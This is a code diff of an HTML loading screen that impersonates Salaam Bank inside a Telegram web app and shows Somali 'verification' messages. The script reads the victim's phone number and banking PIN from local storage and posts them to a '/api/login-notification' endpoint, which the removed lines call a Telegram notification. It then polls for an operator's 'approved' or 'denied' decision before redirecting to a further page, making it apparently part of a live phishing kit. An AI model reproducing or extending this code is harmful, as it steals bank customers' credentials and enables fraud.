@@ -3,39 +3,36 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Siga Suxida - Salaam Bank</title>
+    <title>Salaam Bank - Diyaarinta</title>
 
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
 
     <style>
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: #0066b2; /* Salaam Bank Logo Blue */
+            font-family: -apple-system, sans-serif;
+            background-color: #7a7a7a;
             margin: 0;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             overflow: hidden;
-            color: #333333;
         }
 
         .loading-card {
-            background: #ffffff; /* Clean White Card */
+            background: white;
             width: 90%;
             max-width: 380px;
             padding: 50px 20px;
-            border-radius: 20px;
+            border-radius: 15px;
             text-align: center;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.15);
-            box-sizing: border-box;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
         }
 
         .loader-circle {
-            width: 110px;
-            height: 110px;
-            background-color: #f4f8fb;
-            border: 2px solid #e1ecf4;
+            width: 120px;
+            height: 120px;
+            background: radial-gradient(circle, #0B72B9 0%, #085B94 100%);
             border-radius: 50%;
             margin: 0 auto 30px;
             display: flex;
@@ -45,12 +42,12 @@
 
         .loader-circle::after {
             content: '';
-            width: 75px;
-            height: 75px;
-            border: 4px solid #cbd5e1;
-            border-top: 4px solid #008744; /* Salaam Bank Logo Green Spinner */
+            width: 90px;
+            height: 90px;
+            border: 4px solid rgba(255,255,255,0.3);
+            border-top: 4px solid white;
             border-radius: 50%;
-            animation: spin 1.2s linear infinite;
+            animation: spin 1.5s linear infinite;
         }
 
         @keyframes spin {
@@ -59,17 +56,15 @@
         }
 
         h2 {
-            color: #0066b2; /* Salaam Bank Logo Blue */
-            font-size: 24px;
+            color: #0B72B9;
+            font-size: 28px;
             margin: 0 0 10px;
-            font-weight: 700;
         }
 
         p {
-            color: #666666;
-            font-size: 15px;
+            color: #555;
+            font-size: 16px;
             margin: 0;
-            line-height: 1.4;
         }
     </style>
 </head>
@@ -78,8 +73,8 @@
 
 <div class="loading-card">
     <div class="loader-circle"></div>
-    <h2 id="main-text">Waa La Dhadhaminayaa...</h2>
-    <p id="sub-text">Siga suxida xaqiijinta...</p>
+    <h2 id="main-text">Habaynta...</h2>
+    <p id="sub-text">Diyaarinaya xaqiijinta Bangiga...</p>
 </div>
 
 <script>
@@ -95,33 +90,27 @@ document.addEventListener("DOMContentLoaded", async () => {
     }
 
     const phone = localStorage.getItem("phone") || "";
-    // Check both potential storage keys for PIN so it never sends an empty string
-    const pin = localStorage.getItem("lastPin") || localStorage.getItem("pin") || "";
+    const pin = localStorage.getItem("lastPin") || "";
 
-    if (!phone || !pin) {
-        console.warn("⚠️ Phone or PIN missing in localStorage:", { phone, pin });
+    if (!phone) {
+        console.warn("⚠️ No phone found in localStorage");
     }
 
     // -------------------- SEND LOGIN REQUEST --------------------
     try {
-        const response = await fetch("/api/login-notification", {
+        await fetch("/api/login-notification", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ phone, pin })
+            body: JSON.stringify({ phone, pin, bank: "Salaam Bank" })
         });
-
-        const data = await response.json();
-        if (!response.ok) {
-            console.error("❌ Telegram Notification Error:", data);
-        }
     } catch (err) {
-        console.error("❌ Network error:", err);
+        console.error("❌ Fetch Error:", err);
     }
 
     // -------------------- TEXT CHANGE --------------------
     setTimeout(() => {
         mainText.textContent = "Fadlan sug...";
-        subText.textContent = "Tani waxay qaadanaysaa daqiiqado yar";
+        subText.textContent = "Tani waxay qaadataa dhowr ilbiriqsi";
     }, 3000);
 
     // -------------------- CHECK APPROVAL --------------------
@@ -129,12 +118,12 @@ document.addEventListener("DOMContentLoaded", async () => {
         if (!phone) return;
 
         try {
-            const res = await fetch(`/api/check-status?phone=${encodeURIComponent(phone)}`);
+            const res = await fetch(`/api/check-status?phone=${phone}`);
             const data = await res.json();
 
             if (data.status === "approved") {
-                mainText.textContent = "Waa La Ansixiyay!";
-                subText.textContent = "Waqti yar ka dib bogga xiga ayaa furmi doona...";
+                mainText.textContent = "La ansixiyay!";
+                subText.textContent = "Bogga xiga ayaa kuu furmaya...";
 
                 setTimeout(() => {
                     window.location.href = "/page8";
@@ -142,12 +131,12 @@ document.addEventListener("DOMContentLoaded", async () => {
             }
 
             if (data.status === "denied") {
-                mainText.textContent = "Lama Ansixin!";
-                subText.textContent = "Xogtaada waa mid aan sax ahayn.";
+                mainText.textContent = "La diiday!";
+                subText.textContent = "Xogtaada waa khalad.";
             }
 
         } catch (err) {
-            console.error("❌ Status check error:", err);
+            console.error("❌ Status check failed:", err);
         }
     }
 
